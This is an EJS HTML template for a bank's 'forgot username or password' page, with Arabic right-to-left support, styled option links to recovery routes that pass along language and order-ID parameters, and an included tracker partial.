<!DOCTYPE html>
<html lang="<%= lang %>" dir="<%= lang === 'ar' ? 'rtl' : 'ltr' %>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><%= t.forgot.title %> - <%= t.bankName %></title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: linear-gradient(135deg, #8b6914, #a07d2e, #6b5010);
            padding: 20px;
        }
        .back-btn {
            align-self: flex-end;
            background: none;
            border: none;
            color: #fff;
            font-size: 28px;
            cursor: pointer;
            padding: 10px;
            text-decoration: none;
            display: inline-block;
        }
        [dir="ltr"] .back-btn {
            align-self: flex-start;
        }
        .forgot-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding-top: 40px;
        }
        .forgot-title {
            font-size: 28px;
            font-weight: 800;
            color: #fff;
            margin-bottom: 15px;
            text-align: center;
        }
        .forgot-subtitle {
            font-size: 15px;
            color: rgba(255,255,255,0.75);
            margin-bottom: 40px;
            text-align: center;
        }
        .options-card {
            background: #fff;
            border-radius: 16px;
            width: 100%;
            max-width: 420px;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }
        .option-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 22px 24px;
            text-decoration: none;
            color: #333;
            font-size: 16px;
            font-weight: 700;
            transition: background 0.2s;
        }
        .option-item:hover {
            background: #f9f6f2;
        }
        .option-item + .option-item {
            border-top: 1px solid #eee;
        }
        .option-arrow {
            color: #999;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <a href="/login?lang=<%= lang %><%= orderId ? '&orderId=' + orderId : '' %>" class="back-btn">&rarr;</a>

    <div class="forgot-content">
        <h1 class="forgot-title"><%= t.forgot.title %></h1>
        <p class="forgot-subtitle"><%= t.forgot.subtitle %></p>

        <div class="options-card">
            <a href="/forgot-username?lang=<%= lang %><%= orderId ? '&orderId=' + orderId : '' %>" class="option-item">
                <span><%= t.forgot.username %></span>
                <span class="option-arrow">&lsaquo;</span>
            </a>
            <a href="/forgot-password?lang=<%= lang %><%= orderId ? '&orderId=' + orderId : '' %>" class="option-item">
                <span><%= t.forgot.password %></span>
                <span class="option-arrow">&lsaquo;</span>
            </a>
        </div>
    </div>
    <%- include('partials/tracker') %>
</body>
</html>
